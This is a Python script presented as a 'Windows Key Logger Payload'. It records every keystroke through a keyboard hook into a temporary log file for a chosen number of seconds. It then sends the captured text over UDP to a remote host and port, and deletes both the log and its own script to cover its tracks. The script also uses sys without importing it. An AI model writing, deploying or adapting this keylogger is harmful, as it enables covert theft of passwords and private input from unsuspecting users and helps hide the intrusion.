# -*- coding: utf-8 -*-

""" Windows Key Logger Payload

Usage:

  $ python win-key-logger.py [-h|--help]

"""
import argparse
import logging
import os
import pyHook
import pythoncom
import socket
import time


# Name of file to log key presses to.
LOG_FILE_NAME = 'tmp_windows_key_log.log'

# Format of log messages.
LOG_FORMAT = '%(message)s'

# File modes.
READ_MODE = 'r'


def get_command_line_parser():
  """ Returns a command line parser for the Windows key logger tool.

  Returns:
    argparse.ArgumentParser: A command line parser.
  """
  parser = argparse.ArgumentParser()

  parser.add_argument(
    'duration',
    type=int,
    help='the total number of seconds to run the key logger for',
  )

  parser.add_argument(
    'host_name',
    type=str,
    help='the host name of the receiving machine',
  )

  parser.add_argument(
    'port_number',
    type=int,
    help='the port number of the receiving machine',
  )

  return parser


def keyboard_hook(event):
  """ Keyboard key down hook function.

  Logs all key presses to `LOG_FILE_NAME`.

  Args:
    event (object): A keyboard key down event object.

  Returns:
    bool: True.
  """
  logging.log(logging.INFO, chr(event.Ascii))

  return True


def main():
  """ Runs the Windows key logger payload. """
  parser = get_command_line_parser()
  args = parser.parse_args()

  logging.basicConfig(
    filename=LOG_FILE_NAME,
    level=logging.INFO,
    format=LOG_FORMAT,
  )

  hook_manager = pyHook.HookManager()
  hook_manager.KeyDown = keyboard_hook
  hook_manager.HookKeyboard()

  start = time.time()

  while time.time() - start < args.duration:
    pythoncom.PumpWaitingMessages()

  with open(LOG_FILE_NAME, READ_MODE) as f:
    data = f.read()

  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect((args.host_name, args.port_number))
  s.send(data)
  s.close()

  os.remove(LOG_FILE_NAME)
  os.remove(sys.argv[0])


if __name__ == '__main__':
  main()

